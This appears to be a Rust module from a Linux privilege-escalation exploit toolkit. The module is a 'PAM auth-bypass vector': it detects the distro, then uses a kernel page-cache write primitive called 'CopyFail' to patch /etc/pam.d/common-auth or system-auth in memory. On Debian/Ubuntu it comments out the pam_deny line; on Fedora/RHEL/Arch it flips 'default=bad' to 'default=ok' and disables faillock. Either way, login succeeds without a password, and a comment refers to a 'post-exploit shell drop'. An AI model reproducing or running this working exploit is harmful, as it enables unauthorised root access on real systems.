// PAM auth-bypass vector.
//
// Targets /etc/pam.d/common-auth (Debian/Ubuntu) or /etc/pam.d/system-auth
// (Fedora/RHEL/Arch). Mutates the page cache via the CopyFail primitive so
// the auth chain returns PAM_SUCCESS without a password.
//
// Strategies (R1-derived):
//   - Killshot: 4-byte write replacing `auth` with `#aut` at the start of the
//     `auth requisite ... pam_deny.so` line. Comments the line out; pam_permit
//     in the next line returns SUCCESS. Debian/Ubuntu only.
//   - A1: replace the 9-byte `requisite` token with `optional ` on the same
//     line. Debian/Ubuntu fallback if killshot scan fails.
//   - A2: flip `default=bad` -> `default=ok ` on the pam_unix line AND comment
//     out the pam_faillock authfail line. Fedora/RHEL/Arch.

use crate::splice::CopyFail;
use crate::syscall::close_fd;
use crate::{Error, Vector};
use core::ptr;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DistroFamily {
    DebianUbuntu,
    FedoraRhel,
    Arch,
    Unsupported,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PamError {
    OffsetOutOfBounds,
    OutputTooSmall,
    NotFound,
}

impl From<PamError> for Error {
    fn from(e: PamError) -> Error {
        match e {
            PamError::OffsetOutOfBounds => Error::InvalidArgument("pam: offset OOB"),
            PamError::OutputTooSmall => Error::InvalidArgument("pam: output too small"),
            PamError::NotFound => Error::InvalidArgument("pam: line not found"),
        }
    }
}

const FILE_BUF: usize = 4096; // PAM target file (common-auth ~600B, system-auth ~2KB)
const OS_RELEASE_BUF: usize = 2048; // /etc/os-release (typical ~500B)
const OS_RELEASE_PATH: &[u8] = b"/etc/os-release\0";

const DEBIAN_TARGET: &[u8] = b"/etc/pam.d/common-auth\0";
const FEDORA_TARGET: &[u8] = b"/etc/pam.d/system-auth\0";
const ARCH_TARGET: &[u8] = b"/etc/pam.d/system-auth\0";

const DEBIAN_PERMIT: &[u8] = b"/lib/x86_64-linux-gnu/security/pam_permit.so\0";
const FEDORA_PERMIT: &[u8] = b"/usr/lib64/security/pam_permit.so\0";
const ARCH_PERMIT: &[u8] = b"/usr/lib/security/pam_permit.so\0";

// ----- Distro detection -----

pub fn parse_distro_family(os_release: &[u8]) -> DistroFamily {
    let id = scan_kv(os_release, b"ID");
    let id_like = scan_kv(os_release, b"ID_LIKE");

    if matches_token(id, b"debian")
        || matches_token(id, b"ubuntu")
        || matches_token(id_like, b"debian")
        || matches_token(id_like, b"ubuntu")
    {
        return DistroFamily::DebianUbuntu;
    }
    if matches_token(id, b"fedora")
        || matches_token(id, b"rhel")
        || matches_token(id, b"centos")
        || matches_token(id_like, b"fedora")
        || matches_token(id_like, b"rhel")
    {
        return DistroFamily::FedoraRhel;
    }
    if matches_token(id, b"arch") || matches_token(id_like, b"arch") {
        return DistroFamily::Arch;
    }
    DistroFamily::Unsupported
}

// Extract value for KEY= line from os-release. Returns slice without quotes.
fn scan_kv<'a>(body: &'a [u8], key: &[u8]) -> &'a [u8] {
    let mut i = 0;
    while i < body.len() {
        let line_start = i;
        let line_end = match body[i..].iter().position(|&b| b == b'\n') {
            Some(p) => i + p,
            None => body.len(),
        };
        let line = &body[line_start..line_end];
        if line.len() > key.len() && line.starts_with(key) && line[key.len()] == b'=' {
            let mut v = &line[key.len() + 1..];
            if !v.is_empty() && v[0] == b'"' {
                v = &v[1..];
            }
            if !v.is_empty() && v[v.len() - 1] == b'"' {
                v = &v[..v.len() - 1];
            }
            return v;
        }
        i = line_end + 1;
    }
    &[]
}

// True if `value` (whitespace-separated tokens or single token) contains `tok`.
fn matches_token(value: &[u8], tok: &[u8]) -> bool {
    if value == tok {
        return true;
    }
    let mut i = 0;
    while i < value.len() {
        // Skip whitespace.
        while i < value.len() && (value[i] == b' ' || value[i] == b'\t') {
            i += 1;
        }
        let start = i;
        while i < value.len() && value[i] != b' ' && value[i] != b'\t' {
            i += 1;
        }
        if &value[start..i] == tok {
            return true;
        }
    }
    false
}

// ----- Line scanning -----

// Find offset of the `auth` token on the `auth requisite ... pam_deny.so` line
// in Debian/Ubuntu common-auth. Returns None if absent.
pub fn find_pam_deny_line_offset(content: &[u8]) -> Option<usize> {
    for_each_uncommented_auth_line(content, |_line_start, token_off, line| {
        if line_contains(line, b"requisite") && line_contains(line, b"pam_deny.so") {
            Some(token_off)
        } else {
            None
        }
    })
}

// Find absolute offset of the `default=bad` substring on the pam_unix line in
// Fedora system-auth. Returns None if absent.
pub fn find_fedora_default_bad_offset(content: &[u8]) -> Option<usize> {
    for_each_uncommented_auth_line(content, |line_start, _token_off, line| {
        if line_contains(line, b"pam_unix.so") && line_contains(line, b"default=bad") {
            let needle = b"default=bad";
            line.windows(needle.len())
                .position(|w| w == needle)
                .map(|p| line_start + p)
        } else {
            None
        }
    })
}

// Find offset of the `auth` token on the pam_faillock authfail
// ([default=die]) line in Fedora system-auth. Mutating this offset with `#`
// turns the line into a comment.
pub fn find_fedora_faillock_authfail_line_offset(content: &[u8]) -> Option<usize> {
    for_each_uncommented_auth_line(content, |_line_start, token_off, line| {
        if line_contains(line, b"pam_faillock.so")
            && line_contains(line, b"authfail")
            && line_contains(line, b"[default=die")
        {
            Some(token_off)
        } else {
            None
        }
    })
}

// Walk lines; for each non-comment line whose first non-whitespace token is
// `auth`, call f(line_start, token_off, raw) where:
//   - line_start = absolute offset of line's first byte (incl. leading WS)
//   - token_off  = absolute offset of the `auth` token
//   - raw        = full line bytes (no trailing newline)
// f returns Some(absolute_offset) to short-circuit; first Some wins.
fn for_each_uncommented_auth_line<F>(content: &[u8], mut f: F) -> Option<usize>
where
    F: FnMut(usize, usize, &[u8]) -> Option<usize>,
{
    let mut i = 0;
    while i < content.len() {
        let line_start = i;
        let line_end = match content[i..].iter().position(|&b| b == b'\n') {
            Some(p) => i + p,
            None => content.len(),
        };
        let raw = &content[line_start..line_end];
        let mut j = 0;
        while j < raw.len() && (raw[j] == b' ' || raw[j] == b'\t') {
            j += 1;
        }
        let token_off = line_start + j;
        let rest = &raw[j..];
        if !rest.is_empty() && rest[0] != b'#' && rest.starts_with(b"auth") {
            let after = rest.get(4).copied();
            if after.is_none_or(|c| c == b' ' || c == b'\t') {
                if let Some(r) = f(line_start, token_off, raw) {
                    return Some(r);
                }
            }
        }
        i = line_end + 1;
    }
    None
}

fn line_contains(line: &[u8], needle: &[u8]) -> bool {
    if needle.len() > line.len() {
        return false;
    }
    line.windows(needle.len()).any(|w| w == needle)
}

// FIX 2 (idempotent re-run): detect a `#aut\trequisite ... pam_deny.so` line —
// the result of a prior killshot in the page cache. Returns the absolute
// offset of the `#` byte if present, None otherwise.
//
// This scanner is the inverse of `for_each_uncommented_auth_line`: it looks
// for lines whose first non-whitespace byte is `#` and whose first 4 bytes
// match the killshot signature `#aut`.
pub fn find_pam_deny_killshot_offset(content: &[u8]) -> Option<usize> {
    let mut i = 0;
    while i < content.len() {
        let line_start = i;
        let line_end = match content[i..].iter().position(|&b| b == b'\n') {
            Some(p) => i + p,
            None => content.len(),
        };
        let raw = &content[line_start..line_end];
        let mut j = 0;
        while j < raw.len() && (raw[j] == b' ' || raw[j] == b'\t') {
            j += 1;
        }
        let token_off = line_start + j;
        let rest = &raw[j..];
        if rest.len() > 4 && &rest[..4] == b"#aut" {
            // Reviewer M1: tighten to `\t` only. The killshot replaces `auth`
            // with `#aut` inside the canonical `auth\trequisite\t\t\tpam_deny.so`
            // line — the byte after `#aut` is therefore always a tab. This
            // rejects hand-written comments like `#aut something requisite ...
            // pam_deny.so` that would otherwise false-positive.
            if rest[4] == b'\t'
                && line_contains(rest, b"requisite")
                && line_contains(rest, b"pam_deny.so")
            {
                return Some(token_off);
            }
        }
        i = line_end + 1;
    }
    None
}

// ----- Buffer construction -----

// Copy `original` into `out`, apply mutation, pad length to multiple of 4.
// Length is `min_len` rounded up to multiple of 4, capped to original.len()
// rounded up. Returns the actual length used.
fn build_patched(
    original: &[u8],
    out: &mut [u8],
    mutations: &[(usize, &[u8])],
) -> Result<usize, PamError> {
    // Determine end offset (max mutation end).
    let mut end = 0usize;
    for &(off, bytes) in mutations {
        if off + bytes.len() > original.len() {
            return Err(PamError::OffsetOutOfBounds);
        }
        if off + bytes.len() > end {
            end = off + bytes.len();
        }
    }
    // Round up to multiple of 4.
    let n = (end + 3) & !3;
    if n > original.len() {
        // Mutation tail rounded past EOF -- not safe to extrapolate file bytes.
        return Err(PamError::OffsetOutOfBounds);
    }
    if n > out.len() {
        return Err(PamError::OutputTooSmall);
    }
    // Copy original prefix.
    out[..n].copy_from_slice(&original[..n]);
    // Apply mutations.
    for &(off, bytes) in mutations {
        out[off..off + bytes.len()].copy_from_slice(bytes);
    }
    Ok(n)
}

pub fn build_killshot_buf(
    original: &[u8],
    offset: usize,
    out: &mut [u8],
) -> Result<usize, PamError> {
    build_patched(original, out, &[(offset, b"#aut")])
}

pub fn build_a1_buf(
    original: &[u8],
    line_offset: usize,
    out: &mut [u8],
) -> Result<usize, PamError> {
    if line_offset >= original.len() {
        return Err(PamError::OffsetOutOfBounds);
    }
    // Find 'requisite' within the line.
    let line_end = original[line_offset..]
        .iter()
        .position(|&b| b == b'\n')
        .map(|p| line_offset + p)
        .unwrap_or(original.len());
    let line = &original[line_offset..line_end];
    let req_pos = line
        .windows(9)
        .position(|w| w == b"requisite")
        .ok_or(PamError::NotFound)?;
    let req_off = line_offset + req_pos;
    build_patched(original, out, &[(req_off, b"optional ")])
}

pub fn build_fedora_default_flip_buf(
    original: &[u8],
    offset: usize,
    out: &mut [u8],
) -> Result<usize, PamError> {
    // 'default=bad' (11 bytes) -> 'default=ok ' (11 bytes, trailing space).
    build_patched(original, out, &[(offset, b"default=ok ")])
}

pub fn build_fedora_faillock_comment_buf(
    original: &[u8],
    line_offset: usize,
    out: &mut [u8],
) -> Result<usize, PamError> {
    build_patched(original, out, &[(line_offset, b"#")])
}

// ----- Vector trait impl -----

pub struct PamVector {
    family: DistroFamily,
}

impl Default for PamVector {
    fn default() -> Self {
        Self::new()
    }
}

impl PamVector {
    pub fn new() -> Self {
        let mut buf = [0u8; OS_RELEASE_BUF];
        let n = read_file_to_buf(OS_RELEASE_PATH, &mut buf).unwrap_or(0);
        let family = parse_distro_family(&buf[..n]);
        PamVector { family }
    }

    pub fn family(&self) -> DistroFamily {
        self.family
    }

    fn target_path(&self) -> Option<&'static [u8]> {
        match self.family {
            DistroFamily::DebianUbuntu => Some(DEBIAN_TARGET),
            DistroFamily::FedoraRhel => Some(FEDORA_TARGET),
            DistroFamily::Arch => Some(ARCH_TARGET),
            DistroFamily::Unsupported => None,
        }
    }

    fn permit_path(&self) -> Option<&'static [u8]> {
        match self.family {
            DistroFamily::DebianUbuntu => Some(DEBIAN_PERMIT),
            DistroFamily::FedoraRhel => Some(FEDORA_PERMIT),
            DistroFamily::Arch => Some(ARCH_PERMIT),
            DistroFamily::Unsupported => None,
        }
    }
}

impl Vector for PamVector {
    fn name(&self) -> &'static str {
        "pam"
    }

    fn applicable(&self) -> Result<bool, Error> {
        let target = match self.target_path() {
            Some(p) => p,
            None => return Ok(false),
        };
        let permit = match self.permit_path() {
            Some(p) => p,
            None => return Ok(false),
        };

        if !path_exists(permit) {
            return Ok(false);
        }

        let mut buf = [0u8; FILE_BUF];
        let n = match read_file_to_buf(target, &mut buf) {
            Some(n) => n,
            None => return Ok(false),
        };
        let content = &buf[..n];
        let found = match self.family {
            // FIX 2: applicable in both fresh and already-killshotted state
            // (re-run idempotency). execute() detects the post-mutation case
            // and skips the AF_ALG work.
            DistroFamily::DebianUbuntu => {
                find_pam_deny_line_offset(content).is_some()
                    || find_pam_deny_killshot_offset(content).is_some()
            }
            DistroFamily::FedoraRhel | DistroFamily::Arch => {
                find_fedora_default_bad_offset(content).is_some()
                    && find_fedora_faillock_authfail_line_offset(content).is_some()
            }
            DistroFamily::Unsupported => false,
        };
        Ok(found)
    }

    fn execute(&self, primitive: &mut CopyFail) -> Result<(), Error> {
        let target = self.target_path().ok_or(Error::AlgUnavailable)?;

        // Read target content into stack buffer.
        let mut content = [0u8; FILE_BUF];
        let content_len = read_file_to_buf(target, &mut content).ok_or(Error::OpenFailed)?;
        let original = &content[..content_len];

        // FIX 2: idempotent re-run. If a prior killshot is already visible in
        // the page cache (Debian/Ubuntu), skip the AF_ALG/splice work and
        // return Ok. The caller still proceeds to the post-exploit shell drop
        // because the bypass is already active.
        if matches!(self.family, DistroFamily::DebianUbuntu)
            && find_pam_deny_killshot_offset(original).is_some()
        {
            return Ok(());
        }

        // Build patched buffer per family.
        let mut patched = [0u8; FILE_BUF];
        let patched_len = match self.family {
            DistroFamily::DebianUbuntu => {
                let line_off = find_pam_deny_line_offset(original).ok_or(Error::ParseError)?;
                // Try killshot first (4 bytes); A1 is structurally equivalent
                // here (different content, same write_buffer mechanism). Stick
                // with killshot per R1 -- it commented the line out, smallest
                // mutation surface.
                build_killshot_buf(original, line_off, &mut patched).map_err(Error::from)?
            }
            DistroFamily::FedoraRhel | DistroFamily::Arch => {
                // A2: two writes. Combine into one buffer (both mutations land
                // in same write_buffer call since write_buffer always copies
                // byte-by-byte from offset 0).
                let def_off = find_fedora_default_bad_offset(original).ok_or(Error::ParseError)?;
                let fail_off =
                    find_fedora_faillock_authfail_line_offset(original).ok_or(Error::ParseError)?;
                build_patched(
                    original,
                    &mut patched,
                    &[(def_off, b"default=ok "), (fail_off, b"#")],
                )
                .map_err(Error::from)?
            }
            DistroFamily::Unsupported => return Err(Error::AlgUnavailable),
        };

        // Open target O_RDONLY for splice (page-cache priming + write source).
        let fd = unsafe { libc::open(target.as_ptr() as *const _, libc::O_RDONLY) };
        if fd < 0 {
            return Err(Error::OpenFailed);
        }

        // Prime cache: read full file (drains page-fault chain for the splice).
        let mut prime = [0u8; FILE_BUF];
        unsafe {
            libc::lseek(fd, 0, libc::SEEK_SET);
        }
        let _ = unsafe { libc::read(fd, prime.as_mut_ptr() as *mut _, prime.len()) };
        unsafe {
            libc::lseek(fd, 0, libc::SEEK_SET);
        }

        let result = primitive.write_buffer(fd, &patched[..patched_len]);
        unsafe {
            close_fd(fd);
        }
        result
    }
}

// ----- Helpers -----

fn read_file_to_buf(path_z: &[u8], out: &mut [u8]) -> Option<usize> {
    let fd = unsafe { libc::open(path_z.as_ptr() as *const _, libc::O_RDONLY) };
    if fd < 0 {
        return None;
    }
    let mut total = 0usize;
    while total < out.len() {
        let n = unsafe { libc::read(fd, out.as_mut_ptr().add(total) as *mut _, out.len() - total) };
        if n <= 0 {
            break;
        }
        total += n as usize;
    }
    unsafe {
        close_fd(fd);
    }
    Some(total)
}

fn path_exists(path_z: &[u8]) -> bool {
    let mut st: libc::stat = unsafe { core::mem::zeroed() };
    let rc = unsafe { libc::stat(path_z.as_ptr() as *const _, &mut st as *mut _) };
    rc == 0
}

// Suppress unused-import warnings on hosts without all paths / consts.
#[allow(dead_code)]
fn _unused_ptr_ref() {
    let _ = ptr::null::<u8>();
}
